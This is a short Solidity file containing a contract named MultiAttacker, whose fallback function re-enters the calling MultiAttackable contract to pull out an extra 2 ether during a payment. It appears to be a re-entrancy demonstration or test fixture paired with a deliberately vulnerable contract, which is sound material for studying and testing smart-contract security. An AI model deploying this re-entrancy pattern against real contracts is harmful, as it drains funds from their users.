pragma solidity ^0.4.11;

import "./MultiAttackable.sol";


contract MultiAttacker {

    bool avoidRecursionDuringAttack = false;

    function () public payable {
        if (!avoidRecursionDuringAttack) {
            avoidRecursionDuringAttack = true;
            MultiAttackable(msg.sender).transferTo(this, 2 ether);
            avoidRecursionDuringAttack = false;
        }
    }

}
